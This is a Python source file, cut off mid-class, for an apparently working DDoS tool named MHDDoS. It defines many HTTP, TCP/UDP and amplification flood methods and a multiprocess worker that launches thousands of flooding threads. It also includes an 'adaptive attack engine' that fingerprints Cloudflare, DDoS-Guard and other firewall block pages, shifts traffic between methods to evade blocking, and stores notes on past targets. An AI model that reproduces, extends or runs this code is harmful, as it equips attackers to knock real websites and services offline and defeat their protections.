#!/usr/bin/env python3
 
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
import sys
import traceback
from pathlib import Path
from datetime import datetime
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from re import compile
from random import choice as randchoice, randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
import threading
from time import sleep
import time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from base64 import b64encode
from ssl import OP_NO_COMPRESSION, TLSVersion, _create_unverified_context

import asyncio
from aiohttp import ClientSession, ClientTimeout, TCPConnector

from h2.connection import H2Connection
from h2.events import ResponseReceived, DataReceived
from playwright.sync_api import sync_playwright

# === Death Star modules (Adaptive++ stack) ===
try:
    from deathstar_modules import (
        WAFFingerprint as _DS_WAFFingerprint,
        WebhookNotifier as _DS_WebhookNotifier,
        TargetHealthMonitor as _DS_TargetHealthMonitor,
        ResponseSwapper as _DS_ResponseSwapper,
        SlowlorisFlood as _DS_SlowlorisFlood,
        JSChallengeSolver as _DS_JSChallengeSolver,
        get_global_pool as _DS_get_global_pool,
    )
    from adaptive_plus import (
        Aggressiveness as _AP_Aggressiveness,
        MethodBlacklist as _AP_MethodBlacklist,
        EnhancedAdaptiveController as _AP_EnhancedAdaptiveController,
    )
    _DEATHSTAR_AVAILABLE = True
except Exception as _e:
    _DEATHSTAR_AVAILABLE = False
    _DS_WAFFingerprint = None
    _DS_WebhookNotifier = None
    _DS_TargetHealthMonitor = None
    _AP_EnhancedAdaptiveController = None

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")

# Suppress urllib3 + warnings noise (millions of InsecureRequestWarning during attack)
import warnings as _warnings
_warnings.filterwarnings("ignore")
import logging as _logging
_logging.getLogger("urllib3").setLevel(_logging.ERROR)
_logging.getLogger("urllib3.connectionpool").setLevel(_logging.ERROR)
_logging.getLogger("aiohttp").setLevel(_logging.ERROR)
try:
    import urllib3 as _u3
    _u3.disable_warnings(_u3.exceptions.InsecureRequestWarning)
    _u3.disable_warnings(_u3.exceptions.NotOpenSSLWarning)
except Exception:
    pass

# === Bump file descriptor limit (Unix only) — prevents fd-exhaustion segfault ===
# Default macOS soft limit is 256 open files. Carefully raise — macOS kernel
# limits at kern.maxfilesperproc (~10240). Going beyond may cause setrlimit
# to silently fail or return weird state that crashes native libs at import.
try:
    import resource as _resource
    _soft, _hard = _resource.getrlimit(_resource.RLIMIT_NOFILE)
    # Conservative ceiling: 8192 (well below macOS kern.maxfilesperproc).
    # Don't push to hard limit either — some macOS systems return weird
    # values for hard that crash setrlimit.
    _target = 8192
    if _soft < _target and _hard >= _target:
        _resource.setrlimit(_resource.RLIMIT_NOFILE, (_target, _hard))
        logger.info(f"RLIMIT_NOFILE raised: {_soft} → {_target}")
except Exception:
    pass



ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
try:
    ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
except Exception:
    logger.warning("LibreSSL detected, skipping SECLEVEL cipher restriction")
    try:
        ctx.set_ciphers('ALL:COMPLEMENTOFALL')
    except Exception:
        pass

__version__: str = "2.4 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None
tor2webs = [
            'onion.city',
            'onion.cab',
            'onion.direct',
            'onion.sh',
            'onion.link',
            'onion.ws',
            'onion.pet',
            'onion.rip',
            'onion.plus',
            'onion.top',
            'onion.si',
            'onion.ly',
            'onion.my',
            'onion.sh',
            'onion.lu',
            'onion.casa',
            'onion.com.de',
            'onion.foundation',
            'onion.rodeo',
            'onion.lat',
            'tor2web.org',
            'tor2web.fi',
            'tor2web.blutmagie.de',
            'tor2web.to',
            'tor2web.io',
            'tor2web.in',
            'tor2web.it',
            'tor2web.xyz',
            'tor2web.su',
            'darknet.to',
            's1.tor-gateways.de',
            's2.tor-gateways.de',
            's3.tor-gateways.de',
            's4.tor-gateways.de',
            's5.tor-gateways.de'
        ]

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
        "SLOWLORIS", "WORDPRESS", "H2", "H2_RST", "XMLRPC_MULTI", "COOKIE_HARVEST", "ASYNC",
        "WS", "GQL", "H2_PRIORITY", "RANGE_CRASH",
        "STEALTH", "MIX", "RAPID", "QUIC", "TLS_FLOOD",
            "H2_CONT", "IMPERSONATE", "MEGA"
        }


    LAYER4_AMP: Set[str] = {

        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
                                "TS3", "MCPE", "ICMP"
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]


class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()

# Adaptive engine telemetry counters (shared across all threads)
_ADAPTIVE_2XX = Counter()
_ADAPTIVE_4XX = Counter()
_ADAPTIVE_5XX = Counter()
_ADAPTIVE_TOUT = Counter()

# Per-method telemetry — feeds Bayesian portfolio + ResponseSwapper + MethodBlacklist.
# Layout: { method_name: [s2xx, s4xx, s5xx, stimeout] }
# Protected by _ADAPTIVE_PM_LOCK so increments + snapshot/reset are atomic.
_ADAPTIVE_PER_METHOD: dict = {}
_ADAPTIVE_PM_LOCK = threading.Lock()

# Optional per-request callback hook (set by EnhancedAdaptiveController via
# _set_adaptive_request_hook). Called from hot path with (method, status_code).
# Used to feed ResponseSwapper.report() in real time without polling.
_ADAPTIVE_REQUEST_HOOK = None


def _set_adaptive_request_hook(fn):
    """Install a per-request callback. fn(method:str, status_code:int) -> None.
       Pass None to clear. Hook is invoked from worker threads, so fn must be
       fast and thread-safe."""
    global _ADAPTIVE_REQUEST_HOOK
    _ADAPTIVE_REQUEST_HOOK = fn


def _adaptive_record_status(code: int, method: str = None):
    """Record one response. Updates global buckets AND per-method buckets.
       Also fires _ADAPTIVE_REQUEST_HOOK if set (used by ResponseSwapper)."""
    global _ADAPTIVE_2XX, _ADAPTIVE_4XX, _ADAPTIVE_5XX, _ADAPTIVE_TOUT
    if 200 <= code < 300:
        _ADAPTIVE_2XX += 1
        idx = 0
    elif 400 <= code < 500:
        _ADAPTIVE_4XX += 1
        idx = 1
    elif 500 <= code < 600:
        _ADAPTIVE_5XX += 1
        idx = 2
    else:
        _ADAPTIVE_TOUT += 1
        idx = 3

    if method:
        with _ADAPTIVE_PM_LOCK:
            row = _ADAPTIVE_PER_METHOD.get(method)
            if row is None:
                row = [0, 0, 0, 0]
                _ADAPTIVE_PER_METHOD[method] = row
            row[idx] += 1

    hook = _ADAPTIVE_REQUEST_HOOK
    if hook is not None and method:
        try:
            hook(method, code)
        except Exception:
            pass  # Never let a hook crash the request thread


def _adaptive_snapshot_and_reset():
    """Atomic snapshot+reset of GLOBAL buckets only.
       Use _adaptive_per_method_snapshot_and_reset() for per-method data."""
    global _ADAPTIVE_2XX, _ADAPTIVE_4XX, _ADAPTIVE_5XX, _ADAPTIVE_TOUT
    v = {"2xx": int(_ADAPTIVE_2XX), "4xx": int(_ADAPTIVE_4XX),
         "5xx": int(_ADAPTIVE_5XX), "timeout": int(_ADAPTIVE_TOUT)}
    _ADAPTIVE_2XX.set(0)
    _ADAPTIVE_4XX.set(0)
    _ADAPTIVE_5XX.set(0)
    _ADAPTIVE_TOUT.set(0)
    return v


def _adaptive_per_method_snapshot_and_reset() -> dict:
    """Atomic snapshot+reset of PER-METHOD buckets.
       Returns {method: (s2,s4,s5,st)} compatible with
       AdaptiveAttackEngine.evaluate_and_rotate(per_method_stats=...)."""
    out = {}
    with _ADAPTIVE_PM_LOCK:
        for m, row in _ADAPTIVE_PER_METHOD.items():
            if row[0] or row[1] or row[2] or row[3]:
                out[m] = (row[0], row[1], row[2], row[3])
        _ADAPTIVE_PER_METHOD.clear()
    return out


def _adaptive_record_send_result(method: str, ok: bool):
    """Lightweight telemetry for raw-socket methods (GET/POST/OVH/STRESS/SLOW/etc)
       which cannot read HTTP status codes. Proxy signal: socket.send returned True
       (we treat as success → s2xx bucket) or False (we treat as timeout/conn-reset
       → stimeout bucket). Gives the Bayesian portfolio + MethodBlacklist eyes on
       ALL 25 methods instead of only the 4 cloudscraper-based ones.

       This is a coarser signal than HTTP 200/4xx/5xx but it's the difference
       between adaptive being blind vs being roughly informed."""
    if not method:
        return
    idx = 0 if ok else 3  # 0=s2xx (success), 3=stimeout (failure)
    with _ADAPTIVE_PM_LOCK:
        row = _ADAPTIVE_PER_METHOD.get(method)
        if row is None:
            row = [0, 0, 0, 0]
            _ADAPTIVE_PER_METHOD[method] = row
        row[idx] += 1
    if ok:
        global _ADAPTIVE_2XX
        _ADAPTIVE_2XX += 1
    else:
        global _ADAPTIVE_TOUT
        _ADAPTIVE_TOUT += 1


# Thread-local storage so Tools.send (called from many sites) can know which
# method the current thread is running, without changing 50 call sites.
# HttpFlood.run() sets this once per thread; Tools.send reads it on every send.
_THREAD_METHOD_CTX = threading.local()


def _set_thread_method(method: str):
    """Set per-thread method tag. Read by Tools.send for adaptive telemetry."""
    _THREAD_METHOD_CTX.method = method


def _get_thread_method() -> str:
    """Get per-thread method tag, or empty string if not set."""
    return getattr(_THREAD_METHOD_CTX, 'method', '') or ''





class AdaptiveRPC:
    """Global adaptive RPC: auto-adjusts based on request success rate.
       Increases when throughput stable, halves when requests stop succeeding.
       Thread-safe with batching to reduce lock contention."""
    def __init__(self, initial: int = 10):
        self.current = float(initial)
        self.min_rpc = 2
        self.max_rpc = 100
        self.success_streak = 0
        self.fail_streak = 0
        self.lock = threading.Lock()
        # Thread-local batching to reduce lock contention
        self._local = threading.local()
        self._flush_threshold = 100  # Flush every 100 calls per thread

    def _get_local_counts(self):
        """Get thread-local success/fail counters, creating if needed."""
        if not hasattr(self._local, 'success'):
            self._local.success = 0
            self._local.fail = 0
        return self._local

    def report_success(self):
        """Report success with thread-local batching to reduce lock contention."""
        local = self._get_local_counts()
        local.success += 1
        local.fail = 0
        # Only acquire lock when threshold reached
        if local.success >= self._flush_threshold:
            self._flush_success(local)

    def report_fail(self):
        """Report failure with thread-local batching to reduce lock contention."""
        local = self._get_local_counts()
        local.fail += 1
        local.success = 0
        # Only acquire lock when threshold reached
        if local.fail >= self._flush_threshold:
            self._flush_fail(local)

    def _flush_success(self, local):
        """Flush accumulated success count with lock held."""
        with self.lock:
            self.success_streak += local.success
            if self.success_streak >= 5:
                self.current = min(self.max_rpc, self.current * 1.3)
                self.success_streak = 0
        local.success = 0

    def _flush_fail(self, local):
        """Flush accumulated fail count with lock held."""
        with self.lock:
            self.fail_streak += local.fail
            if self.fail_streak >= 2:
                self.current = max(self.min_rpc, self.current * 0.5)
                self.fail_streak = 0
        local.fail = 0

    def get(self) -> int:
        with self.lock:
            return int(self.current)

    def reset(self, initial: int = 10):
        with self.lock:
            self.current = float(initial)
            self.success_streak = 0
            self.fail_streak = 0
            self._local = threading.local()


_adaptive_rpc = AdaptiveRPC()
AUTO_RPC_ENABLED = False

# Module-level keepalive flag — set by Combined attack when checkbox enabled.
# HttpFlood instances read it during socket open; if True, increases
# _sockets_per_thread to keep more persistent connections open.
_KEEPALIVE_POOL_ENABLED = False


# =============================================================================
# TRUE MULTIPROCESS WORKER — spawns N subprocesses, each with its own GIL.
# Bypasses Python single-process thread limits. macOS allows ~2048 threads per
# process; with N=8 cores, total firepower = 8 × 800 = 6400 effective threads,
# AND each process has independent CPU access (no GIL contention).
# =============================================================================
def _mp_worker_entry(worker_id: int, url_str: str, l7_methods: list,
                      l4_methods: list, threads_per_proc: int, rpc: int,
                      duration: int, proxy_file: str, proxy_ty: int,
                      kill_event=None,
                      shared_total_req=None, shared_total_bytes=None):
    """Subprocess attack worker. Runs independently, no shared state with GUI.
       Prints stats periodically to stdout for parent process aggregation.

       `kill_event` is a multiprocessing.Event shared with the parent. When the
       parent's duration ends (or the user clicks Stop), it sets the event and
       every worker exits its loop immediately — no clock-skew race that lets
       SIGTERM kill workers before they print "Worker finished".

       `shared_total_req` / `shared_total_bytes` are mp.Value shared with the
       parent so the GUI's Live Stats panel sees real worker traffic. Without
       these, REQUESTS_SENT/BYTES_SEND in this subprocess are isolated from
       the parent's counter (spawn-mode on macOS doesn't share globals), and
       the GUI would display ~0 RPS while workers are actually firing
       thousands. Worker accumulates cumulatively here; parent tracks delta."""

    import sys as _sys
    import time as _time
    import threading as _threading
    from pathlib import Path as _Path
    from yarl import URL as _URL
    from socket import gethostbyname as _gethostbyname

    print(f"[MP-{worker_id}] Worker started: {threads_per_proc} threads × "
          f"{len(l7_methods)} L7 + {len(l4_methods)} L4 methods", flush=True)

    parsed_url = _URL(url_str)
    host = parsed_url.host
    event = _threading.Event()

    # Load proxies if needed
    proxies = None
    if proxy_file and proxy_ty != 0:
        try:
            proxy_li = _Path(proxy_file)
            if proxy_li.exists():
                proxies = ProxyUtiles.readFromFile(proxy_li)
        except Exception:
            pass

    uagents = set()
    referers = set()
    try:
        uagents = set(a.strip() for a in (__dir__ / "files/useragent.txt").open("r").readlines())
        referers = set(a.strip() for a in (__dir__ / "files/referers.txt").open("r").readlines())
    except Exception:
        pass

    # === Per-process thread budget enforcement ===
    # Each subprocess has same macOS thread limit (~2048). With 33 L7 methods +
    # 4 L4 methods × 800 threads/method = 26,400 threads per process. macOS
    # rejects with "can't start new thread". Clamp per-method allocation to
    # PER_METHOD_BUDGET = 600 / total_methods so total stays under 800.
    import sys as _sys
    PER_PROC_BUDGET = 600 if _sys.platform == "darwin" else 1200
    total_methods = max(1, len(l7_methods) + len(l4_methods))
    threads_per_method = max(1, min(threads_per_proc, PER_PROC_BUDGET // total_methods))

    print(f"[MP-{worker_id}] Per-method threads clamped: {threads_per_method} "
          f"(budget {PER_PROC_BUDGET}/{total_methods} methods)", flush=True)

    # Spawn L7 threads
    threads_list = []
    for method in l7_methods:
        for tid in range(threads_per_method):
            t = HttpFlood(tid, parsed_url, host, method, rpc,
                          event, uagents, referers, proxies)
            t.daemon = True
            try:
                t.start()
                threads_list.append(t)
            except RuntimeError:
                # macOS thread limit hit — abandon further spawns gracefully
                print(f"[MP-{worker_id}] Thread limit reached at {len(threads_list)}, stopping spawn", flush=True)
                break
        else:
            continue
        break

    # Spawn L4 threads
    if l4_methods:
        try:
            ip = _gethostbyname(host)
        except Exception:
            ip = host
        port = parsed_url.port or 80
        for method in l4_methods:
            for _ in range(threads_per_method):
                t = Layer4((ip, port), None, method, event)
                t.daemon = True
                try:
                    t.start()
                    threads_list.append(t)
                except RuntimeError:
                    print(f"[MP-{worker_id}] L4 thread limit reached", flush=True)
                    break
            else:
                continue
            break


    event.set()
    print(f"[MP-{worker_id}] {len(threads_list)} threads firing", flush=True)

    start_time = _time.time()
    # Loop in 0.5s slices so kill_event check is responsive (the parent sets
    # the event the moment duration ends; we don't want to be stuck inside a
    # 2s sleep when SIGTERM arrives).
    while _time.time() - start_time < duration:
        # Honor parent-side kill signal (set on duration-end OR user-stop).
        if kill_event is not None and kill_event.is_set():
            break
        # Sleep in short slices so we can react fast to kill_event AND still
        # batch stats prints every ~2s.
        slept = 0.0
        while slept < 2.0:
            if kill_event is not None and kill_event.is_set():
                break
            _time.sleep(0.5)
            slept += 0.5
        if kill_event is not None and kill_event.is_set():
            break
        rps = int(REQUESTS_SENT)
        bps = int(BYTES_SEND)
        REQUESTS_SENT.set(0)
        BYTES_SEND.set(0)
        # Bump shared counters so parent GUI's Live Stats sees real traffic
        # instead of ~0. mp.Value is process-safe; with_lock=False is fine
        # here because we only read in parent (no parent write contention),
        # and individual increment is single-instruction at C level.
        if shared_total_req is not None:
            try:
                with shared_total_req.get_lock():
                    shared_total_req.value += rps
            except Exception:
                pass
        if shared_total_bytes is not None:
            try:
                with shared_total_bytes.get_lock():
                    shared_total_bytes.value += bps
            except Exception:
                pass
        # Print stats — parent GUI parses these
        print(f"[MP-{worker_id}] RPS={rps} BPS={bps} t={int(_time.time()-start_time)}s", flush=True)

    event.clear()
    print(f"[MP-{worker_id}] Worker finished", flush=True)





# =============================================================================
# AdaptiveAttackEngine v2 — IQ-900 Strategy AI
#
# Components:
#   ResponseFingerprinter    — HTML content analysis (Cloudflare/DDoS-Guard/WordPress/etc)
#   BayesianStrategyPortfolio — Thompson sampling per-method, probability-weighted allocation
#   TargetMemory             — Cross-attack domain history (method performance, WAF patterns)
#   EWMA Early Warning       — α=0.3 error tracking, predicts blocking BEFORE it hardens
#   Mixed Strategy           — Concurrent multi-phase deployment with dynamic weights
#   Per-Method Telemetry     — Separate success/fail counters per L7 method name
#
# Phase Weights (mixed mode):
#   DIRECT (GET/POST/OVH/etc)   — brute volume, always baseline
#   BYPASS (CFB/BYPASS/etc)    — Cloudflare/DDoS-Guard evasion
#   STEALTH (SLOW/RHEX/etc)    — low-and-slow, evade rate limits
#   RAPID_RESET (H2/QUIC)      — protocol-level exhaustion
#   MIXED_CHAOS                 — random cycling, unpredictable
# =============================================================================
import enum as _enum_mod
import random as _random_mod
import json as _json_mod
import hashlib as _hashlib_mod
from collections import defaultdict as _defaultdict
from math import exp as _math_exp, log as _math_log


# --- Phase definition ---
class AttackPhase(_enum_mod.Enum):
    DIRECT_FLOOD = 0
    BYPASS_MODE = 1
    STEALTH_MODE = 2
    RAPID_RESET = 3
    MIXED_CHAOS = 4


PHASE_METHODS: dict = {
    AttackPhase.DIRECT_FLOOD: ["GET", "POST", "OVH", "STRESS", "DYN", "PPS", "COOKIE", "GSB"],
    AttackPhase.BYPASS_MODE: ["CFB", "CFBUAM", "BYPASS", "DGB", "AVB"],
    AttackPhase.STEALTH_MODE: ["SLOW", "RHEX", "STOMP", "EVEN", "HEAD", "NULL"],
    AttackPhase.RAPID_RESET: ["RAPID", "H2_RST", "QUIC", "ASYNC"],
    AttackPhase.MIXED_CHAOS: [],     # filled at runtime
}

ALL_PHASES = list(AttackPhase)

# --- Response Content Fingerprinter ---
_BLOCK_SIGNATURES = {
    "cloudflare_iuam": [
        b"Checking your browser", b"cf-browser-verification", b"jschl-answer",
        b"/cdn-cgi/l/chk_jschl", b"cf_chl_opt", b"window._cf_chl_opt",
        b"cf-please-wait", b"Cloudflare</title>",
    ],
    "cloudflare_block": [
        b"cf-ray", b"Cloudflare Ray ID", b"cloudflare-nginx",
        b"Attention Required! | Cloudflare", b"cf-wrapper",
    ],
    "ddos_guard": [
        b"DDoS-Guar", b"ddos-guard", b"__ddg1", b"__ddg2",
        b"check.ddos-guard.net",
    ],
    "wordpress_error": [
        b"Error establishing a database connection", b"<wp:",
        b"xmlrpc.php", b"wordpress",
    ],
    "apache_503": [
        b"Service Temporarily Unavailable", b"503 Service",
        b"Apache Server at",
    ],
    "nginx_error": [
        b"502 Bad Gateway", b"503 Service Temporarily Unavailable",
        b"nginx/",
    ],
    "sucuri": [
        b"Sucuri WebSite Firewall", b"Access Denied - Sucuri",
        b"cloudproxy.sucuri.net",
    ],
    "modsecurity": [
        b"ModSecurity", b"This error was generated by Mod_Security",
        b"Not Acceptable!",
    ],
}

class ResponseFingerprinter:
    """Analyze response body content for WAF/CDN/block page signatures."""

    @staticmethod
    def analyze(body_bytes: bytes, status_code: int = 0) -> dict:
        result = {"waf": None, "block_type": "none", "confidence": 0.0}
        if not body_bytes:
            if status_code in (403, 503, 429):
                result["block_type"] = "hard_block"
                result["confidence"] = 0.7
            return result

        body_sample = body_bytes[:4096]
        hits = _defaultdict(int)

        for waf_name, sigs in _BLOCK_SIGNATURES.items():
            for sig in sigs:
                if sig in body_sample:
                    hits[waf_name] += 1

        if hits:
            best_waf = max(hits, key=hits.get)
            total_sigs = len(_BLOCK_SIGNATURES.get(best_waf, [1]))
            result["waf"] = best_waf
            result["confidence"] = min(1.0, hits[best_waf] / max(1, total_sigs * 0.5))
            result["block_type"] = "waf_challenge"
        elif status_code in (403, 503):
            result["block_type"] = "status_block"
            result["confidence"] = 0.4

        return result

    @staticmethod
    def quick_check(body_bytes: bytes) -> str:
        """Fast check: returns 'blocked', 'challenge', or 'clean'."""
        if not body_bytes:
            return "clean"
        sample = body_bytes[:2048]
        # Fast paths
        if b"cf-browser-verification" in sample or b"jschl-answer" in sample:
            return "challenge"
        if b"__ddg1" in sample or b"__ddg2" in sample:
            return "challenge"
        if b"403 Forbidden" in sample or b"503 Service" in sample or b"Access Denied" in sample:
            return "blocked"
        return "clean"


# --- Bayesian Strategy Portfolio ---
class BayesianStrategyPortfolio:
    """Thompson sampling per-method.
       Each method m has Beta(α_m + 1, β_m + 1) prior.
       On each evaluation cycle, sample θ_m ~ Beta, then allocate threads
       proportional to softmax(top-K θ values)."""

    def __init__(self, method_names: list):
        self.lock = threading.Lock()
        self.alpha = {m: 1.0 for m in method_names}  # success count + prior
        self.beta = {m: 1.0 for m in method_names}   # fail count + prior
        self.methods = list(method_names)

    def record(self, method: str, success_count: int, fail_count: int):
        with self.lock:
            if method in self.alpha:
                self.alpha[method] += success_count
                self.beta[method] += fail_count

    def sample_weights(self, top_k: int = 8, explore_ratio: float = 0.20) -> dict:
        """Return {method: weight} dict via Thompson sampling + softmax."""
        import random as _rnd
        with self.lock:
            samples = {}
            for m in self.methods:
                # Thompson sample — guard against invalid beta params
                a, b = max(1e-6, self.alpha[m]), max(1e-6, self.beta[m])
                theta = _rnd.betavariate(a, b)
                samples[m] = theta

            # Get top-K by Thompson score
            ranked = sorted(samples.items(), key=lambda x: x[1], reverse=True)
            top = ranked[:top_k]
            top_methods = [m for m, _ in top]
            top_values = [v for _, v in top]

            # Add exploration: pick random methods not in top-K
            explore_n = max(1, int(len(self.methods) * explore_ratio))
            pool = [m for m in self.methods if m not in top_methods]
            if pool and explore_n > 0:
                explore_picks = _rnd.sample(pool, min(explore_n, len(pool)))
                for m in explore_picks:
                    top_methods.append(m)
                    top_values.append(samples.get(m, 0.1))

            # Softmax normalize
            shifted = [v - max(top_values) for v in top_values]
            exp_vals = [_math_exp(v) for v in shifted]
            total = sum(exp_vals) or 1.0
            weights = {m: exp_vals[i] / total for i, m in enumerate(top_methods)}

            return weights

    def get_stats(self) -> str:
        with self.lock:
            top = sorted(self.alpha.items(), key=lambda x: x[1] / max(x[1] + self.beta[x[0]], 1), reverse=True)[:5]
            stats = ", ".join(f"{m}={self.alpha[m]:.0f}/{self.alpha[m]+self.beta[m]:.0f}" for m, _ in top)
            return f"[Portfolio] Top: {stats}"


# --- Target Memory ---
_TARGET_MEMORY_FILE = __dir__ / "files" / "target_memory.json"
_target_memory_cache = None
_target_memory_lock = threading.Lock()

class TargetMemory:
    """Persistent target fingerprinting across attack sessions.
       Remembers which methods succeeded, WAF detected, and attack timing."""

    @classmethod
    def _load(cls) -> dict:
        global _target_memory_cache
        with _target_memory_lock:
            if _target_memory_cache is not None:
                return _target_memory_cache
            try:
                if _TARGET_MEMORY_FILE.exists():
                    _target_memory_cache = _json_mod.loads(_TARGET_MEMORY_FILE.read_text())
                else:
                    _target_memory_cache = {}
            except Exception:
                _target_memory_cache = {}
            return _target_memory_cache

    @classmethod
    def _save(cls, data: dict):
        try:
            _TARGET_MEMORY_FILE.parent.mkdir(parents=True, exist_ok=True)
            _TARGET_MEMORY_FILE.write_text(_json_mod.dumps(data, indent=2))
            global _target_memory_cache
            _target_memory_cache = data
        except Exception:
            pass

    @staticmethod
    def get_domain_key(url: str) -> str:
        from urllib.parse import urlparse as _urlparse
        parsed = _urlparse(url)
        return parsed.hostname or parsed.netloc or url

    @classmethod
    def recall(cls, url: str) -> dict:
        """Return stored intel for domain, or empty dict."""
        memory = cls._load()
        key = cls.get_domain_key(url)
        return memory.get(key, {})

    @classmethod
    def record_attack(cls, url: str, waf_detected: str,
                      methods_used: list, success_rate: float,
                      best_methods: list):
        """Store attack results for future reference."""
        memory = cls._load()
        key = cls.get_domain_key(url)
        entry = memory.get(key, {})
        entry["last_seen"] = time.time()
        entry["waf"] = waf_detected or entry.get("waf", "unknown")
        entry.setdefault("success_history", []).append({
            "ts": time.time(),
            "success_rate": success_rate,
            "best_methods": best_methods[:5],
        })
        # Keep last 10 entries
        entry["success_history"] = entry["success_history"][-10:]
        # Update method rankings decaying average
        for m in methods_used:
            entry.setdefault("method_scores", {})
            old_score = entry["method_scores"].get(m, 0.5)
            entry["method_scores"][m] = old_score * 0.7 + 0.3  # EMA
        memory[key] = entry
        cls._save(memory)

    @classmethod
    def prewarm_portfolio(cls, url: str, portfolio: BayesianStrategyPortfolio):
        """Seed portfolio with historical method scores if available."""
        intel = cls.recall(url)
        scores = intel.get("method_scores", {})
        if scores:
            for m, score in scores.items():
                # Convert score to pseudo-counts
                portfolio.alpha[m] = max(portfolio.alpha.get(m, 1.0), score * 20)
                portfolio.beta[m] = max(portfolio.beta.get(m, 1.0), (1 - score) * 10)


# --- EWMA Early Warning ---
class EWMADetector:
    """Exponential Weighted Moving Average error tracker.
       α=0.5: recent ticks contribute ~94% of weighted error after 4 cycles
       (vs α=0.3 which needed 7 cycles). Cuts react time in half — important
       because Cloudflare can ramp blocking in <30s, not minutes.
       Early warning fires at 15% error — before hard blocking."""

    def __init__(self, alpha: float = 0.5):
        self.alpha = alpha
        self.ewma_error = 0.0
        self.initialized = False


    def update(self, error_rate: float) -> float:
        if not self.initialized:
            self.ewma_error = error_rate
            self.initialized = True
        else:
            self.ewma_error = self.alpha * error_rate + (1 - self.alpha) * self.ewma_error
        return self.ewma_error

    def severity(self) -> str:
        if self.ewma_error > 0.40:
            return "critical"
        elif self.ewma_error > 0.25:
            return "high"
        elif self.ewma_error > 0.15:
            return "warning"
        elif self.ewma_error > 0.05:
            return "low"
        return "clean"


# --- IQ-900 Adaptive Attack Engine ---
DEFAULT_STRATEGY_WEIGHTS = {
    AttackPhase.DIRECT_FLOOD: 0.35,
    AttackPhase.BYPASS_MODE: 0.25,
    AttackPhase.STEALTH_MODE: 0.18,
    AttackPhase.RAPID_RESET: 0.12,
    AttackPhase.MIXED_CHAOS: 0.10,
}


class AdaptiveAttackEngine:
    """IQ-900 Autonomous Attack AI.
       Combines:
         - Response content fingerprinting (Cloudflare/DDoS-Guard/WordPress detection)
         - Per-method Bayesian Thompson Sampling for optimal thread allocation
         - Target memory for cross-attack learning
         - EWMA early warning to predict blocking before it hardens
         - Mixed concurrent strategy deployment (NEVER single-strategy — always multi-pronged)
         - Connection health monitoring (TLS failures, connection resets, latency spikes)
    """

    def __init__(self, all_l7_methods: list, rpc_getter, log_callback,
                 target_url: str = "", check_interval: float = 8.0):
        self.all_methods = list(all_l7_methods)
        self.rpc_getter = rpc_getter
        self.log = log_callback
        self.check_interval = check_interval
        self.target_url = target_url
        self.lock = threading.Lock()
        self._stop = False

        # Portfolio: per-method Bayesian tracking
        self.portfolio = BayesianStrategyPortfolio(self.all_methods)

        # EWMA error tracker — alpha=0.5 cuts react time in half vs vanilla 0.3
        self.ewma = EWMADetector(alpha=0.5)


        # Mixed strategy weights — NEVER zero any strategy
        self.strategy_weights: dict = dict(DEFAULT_STRATEGY_WEIGHTS)
        self.active_methods: list = self._methods_from_weights(self.strategy_weights)

        # Target memory intel
        self._target_intel = TargetMemory.recall(self.target_url) if target_url else {}
        self._prewarmed = False

        # Fingerprint state
        self.detected_waf: str = self._target_intel.get("waf", "unknown")
        self.last_content_state: str = "unknown"

        # Timing
